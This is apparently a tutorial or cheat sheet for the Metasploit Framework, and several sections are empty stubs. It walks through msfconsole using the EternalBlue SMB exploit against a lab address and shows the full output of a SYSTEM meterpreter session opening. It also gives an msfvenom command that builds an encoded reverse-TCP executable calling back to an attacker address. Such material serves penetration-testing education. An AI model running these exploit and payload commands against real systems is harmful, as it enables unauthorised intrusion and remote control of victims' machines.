# Metasploit Framework
## Introduction
Metasploit Framework is a software developed in Ruby and used to test vulnerabilities in various IT systems. It is powerful and elastic tool for various types of tasks.

### Download & Installation
Installer: https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers

## Basics

### msfconsole
This is the Metasploit console that helps us to run a lot of exploits against target(s) in an easier way.
Some useful command are:
#### search [keyword]
Search for something
```sh
msf > search eternalblue

Matching Modules
================

   Name                                           Disclosure Date  Rank     Description
   ----                                           ---------------  ----     -----------
   auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   auxiliary/scanner/smb/smb_ms17_010                              normal   MS17-010 SMB RCE Detection
   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```
#### use [module]
Use choosen module
```sh 
msf auxiliary(admin/smb/ms17_010_command) > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) >
```
#### show [parameter]
Show various general informations or module-specific informations
```sh 
msf auxiliary(windows/smb/ms17_010_eternalblue) > show -h
[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
```
For example, show module options:
```sh 
msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
   GroomDelta          5                yes       The amount to increase the groom count by per try.
   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
   ProcessName         spoolsv.exe      yes       Process to inject payload into.
   RHOST                                yes       The target address
   RPORT               445              yes       The target port (TCP)
   SMBDomain           .                no        (Optional) The Windows domain to use for authentication
   SMBPass                              no        (Optional) The password for the specified username
   SMBUser                              no        (Optional) The username to authenticate as
   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
   VerifyTarget        true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```
Or show payloads for this module:
```sh 
msf exploit(windows/smb/ms17_010_eternalblue) > show payloads

Compatible Payloads
===================

   Name                                        Disclosure Date  Rank    Description
   ----                                        ---------------  ----    -----------
   generic/custom                                               normal  Custom Payload
   generic/shell_bind_tcp                                       normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                                    normal  Generic Command Shell, Reverse TCP Inline
   windows/x64/exec                                             normal  Windows x64 Execute Command
   windows/x64/loadlibrary                                      normal  Windows x64 LoadLibrary Path
   windows/x64/meterpreter/bind_ipv6_tcp                        normal  Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   windows/x64/meterpreter/bind_named_pipe                      normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   windows/x64/meterpreter/bind_tcp                             normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   windows/x64/meterpreter/bind_tcp_uuid                        normal  Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   windows/x64/meterpreter/reverse_http                         normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   windows/x64/meterpreter/reverse_https                        normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   windows/x64/meterpreter/reverse_named_pipe                   normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   windows/x64/meterpreter/reverse_tcp                          normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   windows/x64/meterpreter/reverse_tcp_rc4                      normal  Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   windows/x64/meterpreter/reverse_tcp_uuid                     normal  Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   windows/x64/meterpreter/reverse_winhttp                      normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   windows/x64/meterpreter/reverse_winhttps                     normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
   windows/x64/powershell_bind_tcp                              normal  Windows Interactive Powershell Session, Bind TCP
   windows/x64/powershell_reverse_tcp                           normal  Windows Interactive Powershell Session, Reverse TCP
   windows/x64/shell/bind_ipv6_tcp                              normal  Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager
   windows/x64/shell/bind_ipv6_tcp_uuid                         normal  Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager with UUID Support
   windows/x64/shell/bind_named_pipe                            normal  Windows x64 Command Shell, Windows x64 Bind Named Pipe Stager
   windows/x64/shell/bind_tcp                                   normal  Windows x64 Command Shell, Windows x64 Bind TCP Stager
   windows/x64/shell/bind_tcp_uuid                              normal  Windows x64 Command Shell, Bind TCP Stager with UUID Support (Windows x64)
   windows/x64/shell/reverse_tcp                                normal  Windows x64 Command Shell, Windows x64 Reverse TCP Stager
   windows/x64/shell/reverse_tcp_rc4                            normal  Windows x64 Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   windows/x64/shell/reverse_tcp_uuid                           normal  Windows x64 Command Shell, Reverse TCP Stager with UUID Support (Windows x64)
   windows/x64/shell_bind_tcp                                   normal  Windows x64 Command Shell, Bind TCP Inline
   windows/x64/shell_reverse_tcp                                normal  Windows x64 Command Shell, Reverse TCP Inline
   windows/x64/vncinject/bind_ipv6_tcp                          normal  Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager
   windows/x64/vncinject/bind_ipv6_tcp_uuid                     normal  Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager with UUID Support
   windows/x64/vncinject/bind_named_pipe                        normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Bind Named Pipe Stager
   windows/x64/vncinject/bind_tcp                               normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Bind TCP Stager
   windows/x64/vncinject/bind_tcp_uuid                          normal  Windows x64 VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x64)
   windows/x64/vncinject/reverse_http                           normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)
   windows/x64/vncinject/reverse_https                          normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)
   windows/x64/vncinject/reverse_tcp                            normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
   windows/x64/vncinject/reverse_tcp_rc4                        normal  Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   windows/x64/vncinject/reverse_tcp_uuid                       normal  Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
   windows/x64/vncinject/reverse_winhttp                        normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
   windows/x64/vncinject/reverse_winhttps                       normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
```
#### set [option] [value]
Set values to options that will be used into the exploit
```sh 
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.0.2
RHOST => 192.168.0.2
```
```sh 
msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```
#### exploit
Attack!
```sh 
msf exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.0.4:4444 
[*] 192.168.0.2:445 - Connecting to target for exploitation.
[+] 192.168.0.2:445 - Connection established for exploitation.
[+] 192.168.0.2:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.0.2:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.0.2:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.0.2:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.0.2:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.0.2:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.0.2:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.0.2:445 - Sending all but last fragment of exploit packet
[*] 192.168.0.2:445 - Starting non-paged pool grooming
[+] 192.168.0.2:445 - Sending SMBv2 buffers
[+] 192.168.0.2:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.0.2:445 - Sending final SMBv2 buffers.
[*] 192.168.0.2:445 - Sending last fragment of exploit packet!
[*] 192.168.0.2:445 - Receiving response from exploit packet
[+] 192.168.0.2:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.0.2:445 - Sending egg to corrupted connection.
[*] 192.168.0.2:445 - Triggering free of corrupted buffer.
[*] Sending stage (206403 bytes) to 192.168.0.2
[*] Meterpreter session 2 opened (192.168.0.4:4444 -> 192.168.0.2:49313) at 2018-08-20 17:05:30 +0200
[+] 192.168.0.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.0.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.0.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```
Now if we want to background session:
```sh 
meterpreter > background
[*] Backgrounding session 2...
```
Show sessions:
```sh 
msf exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type                     Information                       Connection
  --  ----  ----                     -----------                       ----------
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ BLABLA-PC  192.168.0.4:4444 -> 192.168.0.2:49313 (192.168.0.2)
```
Resume session:
```sh 
msf exploit(windows/smb/ms17_010_eternalblue) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```
Close session:
```sh 
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.0.2 - Meterpreter session 2 closed.  Reason: User exit
```

### msfvenom
Metasploit standalone payload generator that replaces msfpayload and msfencode.

#### List: payloads, encoders, nops, platforms, formats, all.
```sh 
msfvenom -l payloads

Framework Payloads (538 total) [--payload <value>]
==================================================

    Name                                                Description
    ----                                                -----------

    windows/meterpreter_bind_named_pipe                 Connect to victim and spawn a Meterpreter shell
    windows/meterpreter_bind_tcp                        Connect to victim and spawn a Meterpreter shell
    windows/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
    windows/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
    windows/meterpreter_reverse_ipv6_tcp                Connect back to attacker and spawn a Meterpreter shell
    windows/meterpreter_reverse_tcp                     Connect back to attacker and spawn a Meterpreter shell

and so on..
```

#### Craft example payload
(payload not tested, this example is here to show you available options)
```sh 
msfvenom --payload windows/meterpreter/reverse_tcp LHOST=192.168.0.5 LPORT=1337 --format exe --arch x86 --encoder x86/shikata_ga_nai --platform windows --bad-chars '\x00\xff'  --iterations 2  --out test.exe
Found 1 compatible encoders
Attempting to encode payload with 2 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai chosen with final size 395
Payload size: 395 bytes
Final size of exe file: 73802 bytes
Saved as: test.exe
```
#### Custom payload (WORK IN PROGRESS)

### msfupdate
This is a command used to update Metasploit Framework, you need to simply launch it in the terminal.
### msfbinscan
### msfelfscan
### msfpescan 
### msfmachscan 
### msfdb 
### msfrop 
### msfrpc 